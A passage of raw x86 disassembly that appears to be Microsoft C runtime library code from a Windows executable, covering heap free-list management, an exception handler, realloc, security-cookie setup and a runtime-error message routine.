  42707e:	cmp    DWORD PTR [eax],0xffffffff
  427081:	jne    0x426fab
  427087:	xor    eax,eax
  427089:	jmp    0x427208
  42708e:	shl    ecx,1
  427090:	inc    edi
  427091:	test   ecx,ecx
  427093:	jge    0x42708e
  427095:	mov    ecx,DWORD PTR [ebp-0xc]
  427098:	mov    edx,DWORD PTR [ecx+edi*8+0x4]
  42709c:	mov    ecx,DWORD PTR [edx]
  42709e:	sub    ecx,DWORD PTR [ebp-0x10]
  4270a1:	mov    esi,ecx
  4270a3:	sar    esi,0x4
  4270a6:	dec    esi
  4270a7:	cmp    esi,0x3f
  4270aa:	mov    DWORD PTR [ebp-0x8],ecx
  4270ad:	jle    0x4270b2
  4270af:	push   0x3f
  4270b1:	pop    esi
  4270b2:	cmp    esi,edi
  4270b4:	je     0x4271bb
  4270ba:	mov    ecx,DWORD PTR [edx+0x4]
  4270bd:	cmp    ecx,DWORD PTR [edx+0x8]
  4270c0:	jne    0x42711e
  4270c2:	cmp    edi,0x20
  4270c5:	mov    ebx,0x80000000
  4270ca:	jge    0x4270f2
  4270cc:	mov    ecx,edi
  4270ce:	shr    ebx,cl
  4270d0:	mov    ecx,DWORD PTR [ebp-0x4]
  4270d3:	lea    edi,[eax+edi*1+0x4]
  4270d7:	not    ebx
  4270d9:	mov    DWORD PTR [ebp-0x14],ebx
  4270dc:	and    ebx,DWORD PTR [eax+ecx*4+0x44]
  4270e0:	mov    DWORD PTR [eax+ecx*4+0x44],ebx
  4270e4:	dec    BYTE PTR [edi]
  4270e6:	jne    0x42711b
  4270e8:	mov    ecx,DWORD PTR [ebp-0x14]
  4270eb:	mov    ebx,DWORD PTR [ebp+0x8]
  4270ee:	and    DWORD PTR [ebx],ecx
  4270f0:	jmp    0x42711e
  4270f2:	lea    ecx,[edi-0x20]
  4270f5:	shr    ebx,cl
  4270f7:	mov    ecx,DWORD PTR [ebp-0x4]
  4270fa:	lea    ecx,[eax+ecx*4+0xc4]
  427101:	lea    edi,[eax+edi*1+0x4]
  427105:	not    ebx
  427107:	and    DWORD PTR [ecx],ebx
  427109:	dec    BYTE PTR [edi]
  42710b:	mov    DWORD PTR [ebp-0x14],ebx
  42710e:	jne    0x42711b
  427110:	mov    ebx,DWORD PTR [ebp+0x8]
  427113:	mov    ecx,DWORD PTR [ebp-0x14]
  427116:	and    DWORD PTR [ebx+0x4],ecx
  427119:	jmp    0x42711e
  42711b:	mov    ebx,DWORD PTR [ebp+0x8]
  42711e:	cmp    DWORD PTR [ebp-0x8],0x0
  427122:	mov    ecx,DWORD PTR [edx+0x8]
  427125:	mov    edi,DWORD PTR [edx+0x4]
  427128:	mov    DWORD PTR [ecx+0x4],edi
  42712b:	mov    ecx,DWORD PTR [edx+0x4]
  42712e:	mov    edi,DWORD PTR [edx+0x8]
  427131:	mov    DWORD PTR [ecx+0x8],edi
  427134:	je     0x4271c7
  42713a:	mov    ecx,DWORD PTR [ebp-0xc]
  42713d:	lea    ecx,[ecx+esi*8]
  427140:	mov    edi,DWORD PTR [ecx+0x4]
  427143:	mov    DWORD PTR [edx+0x8],ecx
  427146:	mov    DWORD PTR [edx+0x4],edi
  427149:	mov    DWORD PTR [ecx+0x4],edx
  42714c:	mov    ecx,DWORD PTR [edx+0x4]
  42714f:	mov    DWORD PTR [ecx+0x8],edx
  427152:	mov    ecx,DWORD PTR [edx+0x4]
  427155:	cmp    ecx,DWORD PTR [edx+0x8]
  427158:	jne    0x4271b8
  42715a:	mov    cl,BYTE PTR [esi+eax*1+0x4]
  42715e:	mov    BYTE PTR [ebp+0xb],cl
  427161:	inc    cl
  427163:	cmp    esi,0x20
  427166:	mov    BYTE PTR [esi+eax*1+0x4],cl
  42716a:	jge    0x42718f
  42716c:	cmp    BYTE PTR [ebp+0xb],0x0
  427170:	jne    0x42717d
  427172:	mov    edi,0x80000000
  427177:	mov    ecx,esi
  427179:	shr    edi,cl
  42717b:	or     DWORD PTR [ebx],edi
  42717d:	mov    ecx,esi
  42717f:	mov    edi,0x80000000
  427184:	shr    edi,cl
  427186:	mov    ecx,DWORD PTR [ebp-0x4]
  427189:	or     DWORD PTR [eax+ecx*4+0x44],edi
  42718d:	jmp    0x4271b8
  42718f:	cmp    BYTE PTR [ebp+0xb],0x0
  427193:	jne    0x4271a2
  427195:	lea    ecx,[esi-0x20]
  427198:	mov    edi,0x80000000
  42719d:	shr    edi,cl
  42719f:	or     DWORD PTR [ebx+0x4],edi
  4271a2:	mov    ecx,DWORD PTR [ebp-0x4]
  4271a5:	lea    edi,[eax+ecx*4+0xc4]
  4271ac:	lea    ecx,[esi-0x20]
  4271af:	mov    esi,0x80000000
  4271b4:	shr    esi,cl
  4271b6:	or     DWORD PTR [edi],esi
  4271b8:	mov    ecx,DWORD PTR [ebp-0x8]
  4271bb:	test   ecx,ecx
  4271bd:	je     0x4271ca
  4271bf:	mov    DWORD PTR [edx],ecx
  4271c1:	mov    DWORD PTR [ecx+edx*1-0x4],ecx
  4271c5:	jmp    0x4271ca
  4271c7:	mov    ecx,DWORD PTR [ebp-0x8]
  4271ca:	mov    esi,DWORD PTR [ebp-0x10]
  4271cd:	add    edx,ecx
  4271cf:	lea    ecx,[esi+0x1]
  4271d2:	mov    DWORD PTR [edx],ecx
  4271d4:	mov    DWORD PTR [edx+esi*1-0x4],ecx
  4271d8:	mov    esi,DWORD PTR [ebp-0xc]
  4271db:	mov    ecx,DWORD PTR [esi]
  4271dd:	test   ecx,ecx
  4271df:	lea    edi,[ecx+0x1]
  4271e2:	mov    DWORD PTR [esi],edi
  4271e4:	jne    0x427200
  4271e6:	cmp    ebx,DWORD PTR ds:0x45def8
  4271ec:	jne    0x427200
  4271ee:	mov    ecx,DWORD PTR [ebp-0x4]
  4271f1:	cmp    ecx,DWORD PTR ds:0x45df10
  4271f7:	jne    0x427200
  4271f9:	and    DWORD PTR ds:0x45def8,0x0
  427200:	mov    ecx,DWORD PTR [ebp-0x4]
  427203:	mov    DWORD PTR [eax],ecx
  427205:	lea    eax,[edx+0x4]
  427208:	pop    edi
  427209:	pop    esi
  42720a:	pop    ebx
  42720b:	leave  
  42720c:	ret    
  42720d:	int3   
  42720e:	int3   
  42720f:	int3   
  427210:	push   esi
  427211:	inc    ebx
  427212:	xor    dh,BYTE PTR [eax]
  427214:	pop    eax
  427215:	inc    ebx
  427216:	xor    BYTE PTR [eax],dh
  427218:	push   ebp
  427219:	mov    ebp,esp
  42721b:	sub    esp,0x8
  42721e:	push   ebx
  42721f:	push   esi
  427220:	push   edi
  427221:	push   ebp
  427222:	cld    
  427223:	mov    ebx,DWORD PTR [ebp+0xc]
  427226:	mov    eax,DWORD PTR [ebp+0x8]
  427229:	test   DWORD PTR [eax+0x4],0x6
  427230:	jne    0x4272b8
  427236:	mov    DWORD PTR [ebp-0x8],eax
  427239:	mov    eax,DWORD PTR [ebp+0x10]
  42723c:	mov    DWORD PTR [ebp-0x4],eax
  42723f:	lea    eax,[ebp-0x8]
  427242:	mov    DWORD PTR [ebx-0x4],eax
  427245:	mov    esi,DWORD PTR [ebx+0xc]
  427248:	mov    edi,DWORD PTR [ebx+0x8]
  42724b:	cmp    esi,0xffffffff
  42724e:	je     0x4272b1
  427250:	lea    ecx,[esi+esi*2]
  427253:	cmp    DWORD PTR [edi+ecx*4+0x4],0x0
  427258:	je     0x42729f
  42725a:	push   esi
  42725b:	push   ebp
  42725c:	lea    ebp,[ebx+0x10]
  42725f:	call   DWORD PTR [edi+ecx*4+0x4]
  427263:	pop    ebp
  427264:	pop    esi
  427265:	mov    ebx,DWORD PTR [ebp+0xc]
  427268:	or     eax,eax
  42726a:	je     0x42729f
  42726c:	js     0x4272aa
  42726e:	mov    edi,DWORD PTR [ebx+0x8]
  427271:	push   ebx
  427272:	call   0x4281a0
  427277:	add    esp,0x4
  42727a:	lea    ebp,[ebx+0x10]
  42727d:	push   esi
  42727e:	push   ebx
  42727f:	call   0x4281e2
  427284:	add    esp,0x8
  427287:	lea    ecx,[esi+esi*2]
  42728a:	push   0x1
  42728c:	mov    eax,DWORD PTR [edi+ecx*4+0x8]
  427290:	call   0x428276
  427295:	mov    eax,DWORD PTR [edi+ecx*4]
  427298:	mov    DWORD PTR [ebx+0xc],eax
  42729b:	call   DWORD PTR [edi+ecx*4+0x8]
  42729f:	mov    edi,DWORD PTR [ebx+0x8]
  4272a2:	lea    ecx,[esi+esi*2]
  4272a5:	mov    esi,DWORD PTR [edi+ecx*4]
  4272a8:	jmp    0x42724b
  4272aa:	mov    eax,0x0
  4272af:	jmp    0x4272cd
  4272b1:	mov    eax,0x1
  4272b6:	jmp    0x4272cd
  4272b8:	push   ebp
  4272b9:	lea    ebp,[ebx+0x10]
  4272bc:	push   0xffffffff
  4272be:	push   ebx
  4272bf:	call   0x4281e2
  4272c4:	add    esp,0x8
  4272c7:	pop    ebp
  4272c8:	mov    eax,0x1
  4272cd:	pop    ebp
  4272ce:	pop    edi
  4272cf:	pop    esi
  4272d0:	pop    ebx
  4272d1:	mov    esp,ebp
  4272d3:	pop    ebp
  4272d4:	ret    
  4272d5:	push   ebp
  4272d6:	mov    ecx,DWORD PTR [esp+0x8]
  4272da:	mov    ebp,DWORD PTR [ecx]
  4272dc:	mov    eax,DWORD PTR [ecx+0x1c]
  4272df:	push   eax
  4272e0:	mov    eax,DWORD PTR [ecx+0x18]
  4272e3:	push   eax
  4272e4:	call   0x4281e2
  4272e9:	add    esp,0x8
  4272ec:	pop    ebp
  4272ed:	ret    0x4
  4272f0:	call   0x425203
  4272f5:	add    eax,0x8
  4272f8:	ret    
  4272f9:	push   0x14
  4272fb:	push   0x429880
  427300:	call   0x425350
  427305:	mov    edi,DWORD PTR [ebp+0x8]
  427308:	xor    ebx,ebx
  42730a:	cmp    edi,ebx
  42730c:	jne    0x42731c
  42730e:	push   DWORD PTR [ebp+0xc]
  427311:	call   0x426072
  427316:	pop    ecx
  427317:	jmp    0x4274a0
  42731c:	mov    esi,DWORD PTR [ebp+0xc]
  42731f:	cmp    esi,ebx
  427321:	jne    0x42732f
  427323:	push   edi
  427324:	call   0x425f5a
  427329:	pop    ecx
  42732a:	jmp    0x42749e
  42732f:	cmp    DWORD PTR ds:0x45e144,0x3
  427336:	jne    0x42746a
  42733c:	mov    DWORD PTR [ebp-0x1c],ebx
  42733f:	cmp    esi,0xffffffe0
  427342:	ja     0x427439
  427348:	push   0x4
  42734a:	call   0x42550f
  42734f:	pop    ecx
  427350:	mov    DWORD PTR [ebp-0x4],ebx
  427353:	push   edi
  427354:	call   0x426732
  427359:	pop    ecx
  42735a:	mov    DWORD PTR [ebp-0x20],eax
  42735d:	cmp    eax,ebx
  42735f:	je     0x427409
  427365:	cmp    esi,DWORD PTR ds:0x45df04
  42736b:	ja     0x4273b9
  42736d:	push   esi
  42736e:	push   edi
  42736f:	push   eax
  427370:	call   0x426c32
  427375:	add    esp,0xc
  427378:	test   eax,eax
  42737a:	je     0x427381
  42737c:	mov    DWORD PTR [ebp-0x1c],edi
  42737f:	jmp    0x4273b9
  427381:	push   esi
  427382:	call   0x426f11
  427387:	pop    ecx
  427388:	mov    DWORD PTR [ebp-0x1c],eax
  42738b:	cmp    eax,ebx
  42738d:	je     0x4273b9
  42738f:	mov    eax,DWORD PTR [edi-0x4]
  427392:	dec    eax
  427393:	mov    DWORD PTR [ebp-0x24],eax
  427396:	cmp    eax,esi
  427398:	jb     0x42739c
  42739a:	mov    eax,esi
  42739c:	push   eax
  42739d:	push   edi
  42739e:	push   DWORD PTR [ebp-0x1c]
  4273a1:	call   0x426090
  4273a6:	push   edi
  4273a7:	call   0x426732
  4273ac:	mov    DWORD PTR [ebp-0x20],eax
  4273af:	push   edi
  4273b0:	push   eax
  4273b1:	call   0x42675d
  4273b6:	add    esp,0x18
  4273b9:	cmp    DWORD PTR [ebp-0x1c],ebx
  4273bc:	jne    0x427409
  4273be:	cmp    esi,ebx
  4273c0:	jne    0x4273c8
  4273c2:	xor    esi,esi
  4273c4:	inc    esi
  4273c5:	mov    DWORD PTR [ebp+0xc],esi
  4273c8:	add    esi,0xf
  4273cb:	and    esi,0xfffffff0
  4273ce:	mov    DWORD PTR [ebp+0xc],esi
  4273d1:	push   esi
  4273d2:	push   ebx
  4273d3:	push   DWORD PTR ds:0x45e140
  4273d9:	call   DWORD PTR ds:0x429030
  4273df:	mov    DWORD PTR [ebp-0x1c],eax
  4273e2:	cmp    eax,ebx
  4273e4:	je     0x427409
  4273e6:	mov    eax,DWORD PTR [edi-0x4]
  4273e9:	dec    eax
  4273ea:	mov    DWORD PTR [ebp-0x24],eax
  4273ed:	cmp    eax,esi
  4273ef:	jb     0x4273f3
  4273f1:	mov    eax,esi
  4273f3:	push   eax
  4273f4:	push   edi
  4273f5:	push   DWORD PTR [ebp-0x1c]
  4273f8:	call   0x426090
  4273fd:	push   edi
  4273fe:	push   DWORD PTR [ebp-0x20]
  427401:	call   0x42675d
  427406:	add    esp,0x14
  427409:	or     DWORD PTR [ebp-0x4],0xffffffff
  42740d:	call   0x427461
  427412:	cmp    DWORD PTR [ebp-0x20],ebx
  427415:	jne    0x427439
  427417:	cmp    esi,ebx
  427419:	jne    0x42741e
  42741b:	xor    esi,esi
  42741d:	inc    esi
  42741e:	add    esi,0xf
  427421:	and    esi,0xfffffff0
  427424:	mov    DWORD PTR [ebp+0xc],esi
  427427:	push   esi
  427428:	push   edi
  427429:	push   ebx
  42742a:	push   DWORD PTR ds:0x45e140
  427430:	call   DWORD PTR ds:0x4290d4
  427436:	mov    DWORD PTR [ebp-0x1c],eax
  427439:	mov    eax,DWORD PTR [ebp-0x1c]
  42743c:	cmp    eax,ebx
  42743e:	jne    0x4274a0
  427440:	cmp    DWORD PTR ds:0x45ddc8,ebx
  427446:	je     0x4274a0
  427448:	push   esi
  427449:	call   0x427c32
  42744e:	pop    ecx
  42744f:	test   eax,eax
  427451:	jne    0x42733c
  427457:	jmp    0x42749e
  427459:	xor    ebx,ebx
  42745b:	mov    esi,DWORD PTR [ebp+0xc]
  42745e:	mov    edi,DWORD PTR [ebp+0x8]
  427461:	push   0x4
  427463:	call   0x42547b
  427468:	pop    ecx
  427469:	ret    
  42746a:	xor    eax,eax
  42746c:	cmp    esi,0xffffffe0
  42746f:	ja     0x427487
  427471:	cmp    esi,ebx
  427473:	jne    0x427478
  427475:	xor    esi,esi
  427477:	inc    esi
  427478:	push   esi
  427479:	push   edi
  42747a:	push   ebx
  42747b:	push   DWORD PTR ds:0x45e140
  427481:	call   DWORD PTR ds:0x4290d4
  427487:	cmp    eax,ebx
  427489:	jne    0x4274a0
  42748b:	cmp    DWORD PTR ds:0x45ddc8,ebx
  427491:	je     0x4274a0
  427493:	push   esi
  427494:	call   0x427c32
  427499:	pop    ecx
  42749a:	test   eax,eax
  42749c:	jne    0x42746a
  42749e:	xor    eax,eax
  4274a0:	call   0x42538b
  4274a5:	ret    
  4274a6:	push   0x10
  4274a8:	push   0x429890
  4274ad:	call   0x425350
  4274b2:	cmp    DWORD PTR ds:0x45e144,0x3
  4274b9:	jne    0x4274f5
  4274bb:	push   0x4
  4274bd:	call   0x42550f
  4274c2:	pop    ecx
  4274c3:	and    DWORD PTR [ebp-0x4],0x0
  4274c7:	mov    esi,DWORD PTR [ebp+0x8]
  4274ca:	push   esi
  4274cb:	call   0x426732
  4274d0:	pop    ecx
  4274d1:	mov    DWORD PTR [ebp-0x1c],eax
  4274d4:	test   eax,eax
  4274d6:	je     0x4274e3
  4274d8:	mov    esi,DWORD PTR [esi-0x4]
  4274db:	sub    esi,0x9
  4274de:	mov    DWORD PTR [ebp-0x20],esi
  4274e1:	jmp    0x4274e6
  4274e3:	mov    esi,DWORD PTR [ebp-0x20]
  4274e6:	or     DWORD PTR [ebp-0x4],0xffffffff
  4274ea:	call   0x427513
  4274ef:	cmp    DWORD PTR [ebp-0x1c],0x0
  4274f3:	jne    0x427508
  4274f5:	push   DWORD PTR [ebp+0x8]
  4274f8:	push   0x0
  4274fa:	push   DWORD PTR ds:0x45e140
  427500:	call   DWORD PTR ds:0x4290d8
  427506:	mov    esi,eax
  427508:	mov    eax,esi
  42750a:	call   0x42538b
  42750f:	ret    
  427510:	mov    esi,DWORD PTR [ebp-0x20]
  427513:	push   0x4
  427515:	call   0x42547b
  42751a:	pop    ecx
  42751b:	ret    
  42751c:	push   ebp
  42751d:	mov    ebp,esp
  42751f:	sub    esp,0x10
  427522:	push   esi
  427523:	lea    eax,[ebp-0x8]
  427526:	push   eax
  427527:	call   DWORD PTR ds:0x4290e8
  42752d:	mov    esi,DWORD PTR [ebp-0x4]
  427530:	xor    esi,DWORD PTR [ebp-0x8]
  427533:	call   DWORD PTR ds:0x4290e4
  427539:	xor    esi,eax
  42753b:	call   DWORD PTR ds:0x42909c
  427541:	xor    esi,eax
  427543:	call   DWORD PTR ds:0x4290e0
  427549:	xor    esi,eax
  42754b:	lea    eax,[ebp-0x10]
  42754e:	push   eax
  42754f:	call   DWORD PTR ds:0x4290dc
  427555:	mov    eax,DWORD PTR [ebp-0xc]
  427558:	xor    eax,DWORD PTR [ebp-0x10]
  42755b:	xor    esi,eax
  42755d:	mov    DWORD PTR ds:0x45d430,esi
  427563:	jne    0x42756f
  427565:	mov    DWORD PTR ds:0x45d430,0xbb40e64e
  42756f:	pop    esi
  427570:	leave  
  427571:	ret    
  427572:	push   0x118
  427577:	push   0x429a40
  42757c:	call   0x425350
  427581:	mov    eax,ds:0x45d430
  427586:	xor    eax,DWORD PTR [ebp+0x4]
  427589:	mov    DWORD PTR [ebp-0x1c],eax
  42758c:	mov    eax,ds:0x45dd98
  427591:	xor    ecx,ecx
  427593:	cmp    eax,ecx
  427595:	je     0x4275b6
  427597:	mov    DWORD PTR [ebp-0x4],ecx
  42759a:	push   DWORD PTR [ebp+0xc]
  42759d:	push   DWORD PTR [ebp+0x8]
  4275a0:	call   eax
  4275a2:	pop    ecx
  4275a3:	pop    ecx
  4275a4:	or     DWORD PTR [ebp-0x4],0xffffffff
  4275a8:	jmp    0x4276b4
  4275ad:	xor    eax,eax
  4275af:	inc    eax
  4275b0:	ret    
  4275b1:	mov    esp,DWORD PTR [ebp-0x18]
  4275b4:	jmp    0x4275a4
  4275b6:	mov    eax,DWORD PTR [ebp+0x8]
  4275b9:	dec    eax
  4275ba:	je     0x4275cf
  4275bc:	mov    edi,0x429a1c
  4275c1:	mov    DWORD PTR [ebp-0x20],0x429968
  4275c8:	mov    esi,0xd4
  4275cd:	jmp    0x4275e0
  4275cf:	mov    edi,0x429948
  4275d4:	mov    DWORD PTR [ebp-0x20],0x4298a8
  4275db:	mov    esi,0xb9
  4275e0:	mov    BYTE PTR [ebp-0x24],cl
  4275e3:	push   0x104
  4275e8:	lea    eax,[ebp-0x128]
  4275ee:	push   eax
  4275ef:	push   ecx
  4275f0:	call   DWORD PTR ds:0x42906c
  4275f6:	test   eax,eax
  4275f8:	jne    0x42760d
  4275fa:	push   0x42959c
  4275ff:	lea    eax,[ebp-0x128]
  427605:	push   eax
  427606:	call   0x425730
  42760b:	pop    ecx
  42760c:	pop    ecx
  42760d:	lea    ebx,[ebp-0x128]
  427613:	lea    eax,[ebp-0x128]
  427619:	push   eax
  42761a:	call   0x425960
  42761f:	pop    ecx
  427620:	add    eax,0xb
  427623:	cmp    eax,0x3c
  427626:	jbe    0x427651
  427628:	lea    eax,[ebp-0x128]
  42762e:	push   eax
  42762f:	call   0x425960
  427634:	mov    ebx,eax
  427636:	lea    eax,[ebp-0x128]
  42763c:	sub    eax,0x31
  42763f:	add    ebx,eax
  427641:	push   0x3
  427643:	push   0x429598
  427648:	push   ebx
  427649:	call   0x425830
  42764e:	add    esp,0x10
  427651:	push   ebx
  427652:	call   0x425960
  427657:	pop    ecx
  427658:	lea    eax,[eax+esi*1+0xc]
  42765c:	add    eax,0x3
  42765f:	and    eax,0xfffffffc
  427662:	call   0x4253a0
  427667:	mov    DWORD PTR [ebp-0x18],esp
  42766a:	mov    esi,esp
  42766c:	push   edi
  42766d:	push   esi
  42766e:	call   0x425730
  427673:	mov    edi,0x429578
  427678:	push   edi
  427679:	push   esi
  42767a:	call   0x425740
  42767f:	push   0x42989c
  427684:	push   esi
  427685:	call   0x425740
  42768a:	push   ebx
  42768b:	push   esi
  42768c:	call   0x425740
  427691:	push   edi
  427692:	push   esi
  427693:	call   0x425740
  427698:	push   DWORD PTR [ebp-0x20]
  42769b:	push   esi
  42769c:	call   0x425740
  4276a1:	push   0x12010
  4276a6:	push   0x429550
  4276ab:	push   esi
  4276ac:	call   0x425632
  4276b1:	add    esp,0x3c
  4276b4:	push   0x3
  4276b6:	call   0x4247bc
  4276bb:	int3   
  4276bc:	push   0x38
  4276be:	push   0x429e60
  4276c3:	call   0x425350
  4276c8:	xor    ebx,ebx
  4276ca:	cmp    DWORD PTR ds:0x45ddbc,ebx
  4276d0:	jne    0x42770a
  4276d2:	push   ebx
  4276d3:	push   ebx
  4276d4:	xor    esi,esi
  4276d6:	inc    esi
  4276d7:	push   esi
  4276d8:	push   0x429e5c
  4276dd:	push   0x100
  4276e2:	push   ebx
  4276e3:	call   DWORD PTR ds:0x4290f4
  4276e9:	test   eax,eax
  4276eb:	je     0x4276f5
  4276ed:	mov    DWORD PTR ds:0x45ddbc,esi
  4276f3:	jmp    0x42770a
  4276f5:	call   DWORD PTR ds:0x429028
  4276fb:	cmp    eax,0x78
  4276fe:	jne    0x42770a
  427700:	mov    DWORD PTR ds:0x45ddbc,0x2
  42770a:	cmp    DWORD PTR [ebp+0x14],ebx
  42770d:	jle    0x42772a
  42770f:	mov    ecx,DWORD PTR [ebp+0x14]
  427712:	mov    eax,DWORD PTR [ebp+0x10]
  427715:	dec    ecx
  427716:	cmp    BYTE PTR [eax],bl
  427718:	je     0x427722
  42771a:	inc    eax
  42771b:	cmp    ecx,ebx
  42771d:	jne    0x427715
  42771f:	or     ecx,0xffffffff
  427722:	or     eax,0xffffffff
  427725:	sub    eax,ecx
  427727:	add    DWORD PTR [ebp+0x14],eax
  42772a:	mov    eax,ds:0x45ddbc
  42772f:	cmp    eax,0x2
  427732:	je     0x427914
  427738:	cmp    eax,ebx
  42773a:	je     0x427914
  427740:	cmp    eax,0x1
  427743:	jne    0x427947
  427749:	xor    edi,edi
  42774b:	mov    DWORD PTR [ebp-0x1c],edi
  42774e:	mov    DWORD PTR [ebp-0x20],ebx
  427751:	mov    DWORD PTR [ebp-0x24],ebx
  427754:	cmp    DWORD PTR [ebp+0x20],ebx
  427757:	jne    0x427761
  427759:	mov    eax,ds:0x45ddb4
  42775e:	mov    DWORD PTR [ebp+0x20],eax
  427761:	push   ebx
  427762:	push   ebx
  427763:	push   DWORD PTR [ebp+0x14]
  427766:	push   DWORD PTR [ebp+0x10]
  427769:	xor    eax,eax
  42776b:	cmp    DWORD PTR [ebp+0x24],ebx
  42776e:	setne  al
  427771:	lea    eax,[eax*8+0x1]
  427778:	push   eax
  427779:	push   DWORD PTR [ebp+0x20]
  42777c:	call   DWORD PTR ds:0x4290f0
  427782:	mov    esi,eax
  427784:	mov    DWORD PTR [ebp-0x28],esi
  427787:	cmp    esi,ebx
  427789:	je     0x427947
  42778f:	mov    DWORD PTR [ebp-0x4],0x1
  427796:	lea    eax,[esi+esi*1]
  427799:	add    eax,0x3
  42779c:	and    eax,0xfffffffc
  42779f:	call   0x4253a0
  4277a4:	mov    DWORD PTR [ebp-0x18],esp
  4277a7:	mov    eax,esp
  4277a9:	mov    DWORD PTR [ebp-0x2c],eax
  4277ac:	or     DWORD PTR [ebp-0x4],0xffffffff
  4277b0:	jmp    0x4277cd
  4277b2:	xor    eax,eax
  4277b4:	inc    eax
  4277b5:	ret    
  4277b6:	mov    esp,DWORD PTR [ebp-0x18]
  4277b9:	call   0x4287e5
  4277be:	xor    ebx,ebx
  4277c0:	mov    DWORD PTR [ebp-0x2c],ebx
  4277c3:	or     DWORD PTR [ebp-0x4],0xffffffff
  4277c7:	mov    edi,DWORD PTR [ebp-0x1c]
  4277ca:	mov    esi,DWORD PTR [ebp-0x28]
  4277cd:	cmp    DWORD PTR [ebp-0x2c],ebx
  4277d0:	jne    0x4277ee
  4277d2:	lea    eax,[esi+esi*1]
  4277d5:	push   eax
  4277d6:	call   0x426072
  4277db:	pop    ecx
  4277dc:	mov    DWORD PTR [ebp-0x2c],eax
  4277df:	cmp    eax,ebx
  4277e1:	je     0x427947
  4277e7:	mov    DWORD PTR [ebp-0x20],0x1
  4277ee:	push   esi
  4277ef:	push   DWORD PTR [ebp-0x2c]
  4277f2:	push   DWORD PTR [ebp+0x14]
  4277f5:	push   DWORD PTR [ebp+0x10]
  4277f8:	push   0x1
  4277fa:	push   DWORD PTR [ebp+0x20]
  4277fd:	call   DWORD PTR ds:0x4290f0
  427803:	test   eax,eax
  427805:	je     0x4278f1
  42780b:	push   ebx
  42780c:	push   ebx
  42780d:	push   esi
  42780e:	push   DWORD PTR [ebp-0x2c]
  427811:	push   DWORD PTR [ebp+0xc]
  427814:	push   DWORD PTR [ebp+0x8]
  427817:	call   DWORD PTR ds:0x4290f4
  42781d:	mov    edi,eax
  42781f:	mov    DWORD PTR [ebp-0x1c],edi
  427822:	cmp    edi,ebx
  427824:	je     0x4278f1
  42782a:	test   BYTE PTR [ebp+0xd],0x4
  42782e:	je     0x42785d
  427830:	cmp    DWORD PTR [ebp+0x1c],ebx
  427833:	je     0x4278f1
  427839:	cmp    edi,DWORD PTR [ebp+0x1c]
  42783c:	jg     0x4278f1
  427842:	push   DWORD PTR [ebp+0x1c]
  427845:	push   DWORD PTR [ebp+0x18]
  427848:	push   esi
  427849:	push   DWORD PTR [ebp-0x2c]
  42784c:	push   DWORD PTR [ebp+0xc]
  42784f:	push   DWORD PTR [ebp+0x8]
  427852:	call   DWORD PTR ds:0x4290f4
  427858:	jmp    0x4278f1
  42785d:	mov    DWORD PTR [ebp-0x4],0x2
  427864:	lea    eax,[edi+edi*1]
  427867:	add    eax,0x3
  42786a:	and    eax,0xfffffffc
  42786d:	call   0x4253a0
  427872:	mov    DWORD PTR [ebp-0x18],esp
  427875:	mov    eax,esp
  427877:	mov    DWORD PTR [ebp-0x30],eax
  42787a:	or     DWORD PTR [ebp-0x4],0xffffffff
  42787e:	jmp    0x42789b
  427880:	xor    eax,eax
  427882:	inc    eax
  427883:	ret    
  427884:	mov    esp,DWORD PTR [ebp-0x18]
  427887:	call   0x4287e5
  42788c:	xor    ebx,ebx
  42788e:	mov    DWORD PTR [ebp-0x30],ebx
  427891:	or     DWORD PTR [ebp-0x4],0xffffffff
  427895:	mov    edi,DWORD PTR [ebp-0x1c]
  427898:	mov    esi,DWORD PTR [ebp-0x28]
  42789b:	cmp    DWORD PTR [ebp-0x30],ebx
  42789e:	jne    0x4278b8
  4278a0:	lea    eax,[edi+edi*1]
  4278a3:	push   eax
  4278a4:	call   0x426072
  4278a9:	pop    ecx
  4278aa:	mov    DWORD PTR [ebp-0x30],eax
  4278ad:	cmp    eax,ebx
  4278af:	je     0x4278f1
  4278b1:	mov    DWORD PTR [ebp-0x24],0x1
  4278b8:	push   edi
  4278b9:	push   DWORD PTR [ebp-0x30]
  4278bc:	push   esi
  4278bd:	push   DWORD PTR [ebp-0x2c]
  4278c0:	push   DWORD PTR [ebp+0xc]
  4278c3:	push   DWORD PTR [ebp+0x8]
  4278c6:	call   DWORD PTR ds:0x4290f4
  4278cc:	test   eax,eax
  4278ce:	je     0x4278f1
  4278d0:	push   ebx
  4278d1:	push   ebx
  4278d2:	cmp    DWORD PTR [ebp+0x1c],ebx
  4278d5:	jne    0x4278db
  4278d7:	push   ebx
  4278d8:	push   ebx
  4278d9:	jmp    0x4278e1
  4278db:	push   DWORD PTR [ebp+0x1c]
  4278de:	push   DWORD PTR [ebp+0x18]
  4278e1:	push   edi
  4278e2:	push   DWORD PTR [ebp-0x30]
  4278e5:	push   ebx
  4278e6:	push   DWORD PTR [ebp+0x20]
  4278e9:	call   DWORD PTR ds:0x429080
  4278ef:	mov    edi,eax
  4278f1:	cmp    DWORD PTR [ebp-0x24],ebx
  4278f4:	je     0x4278ff
  4278f6:	push   DWORD PTR [ebp-0x30]
  4278f9:	call   0x425f5a
  4278fe:	pop    ecx
  4278ff:	cmp    DWORD PTR [ebp-0x20],ebx
  427902:	je     0x42790d
  427904:	push   DWORD PTR [ebp-0x2c]
  427907:	call   0x425f5a
  42790c:	pop    ecx
  42790d:	mov    eax,edi
  42790f:	jmp    0x427a6f
  427914:	mov    DWORD PTR [ebp-0x34],ebx
  427917:	xor    edi,edi
  427919:	mov    DWORD PTR [ebp-0x38],ebx
  42791c:	cmp    DWORD PTR [ebp+0x8],ebx
  42791f:	jne    0x427929
  427921:	mov    eax,ds:0x45dda4
  427926:	mov    DWORD PTR [ebp+0x8],eax
  427929:	cmp    DWORD PTR [ebp+0x20],ebx
  42792c:	jne    0x427936
  42792e:	mov    eax,ds:0x45ddb4
  427933:	mov    DWORD PTR [ebp+0x20],eax
  427936:	push   DWORD PTR [ebp+0x8]
  427939:	call   0x4285cd
  42793e:	pop    ecx
  42793f:	mov    DWORD PTR [ebp-0x3c],eax
  427942:	cmp    eax,0xffffffff
  427945:	jne    0x42794e
  427947:	xor    eax,eax
  427949:	jmp    0x427a6f
  42794e:	cmp    eax,DWORD PTR [ebp+0x20]
  427951:	je     0x427a45
  427957:	push   ebx
  427958:	push   ebx
  427959:	lea    ecx,[ebp+0x14]
  42795c:	push   ecx
  42795d:	push   DWORD PTR [ebp+0x10]
  427960:	push   eax
  427961:	push   DWORD PTR [ebp+0x20]
  427964:	call   0x428616
  427969:	add    esp,0x18
  42796c:	mov    DWORD PTR [ebp-0x34],eax
  42796f:	cmp    eax,ebx
  427971:	je     0x427947
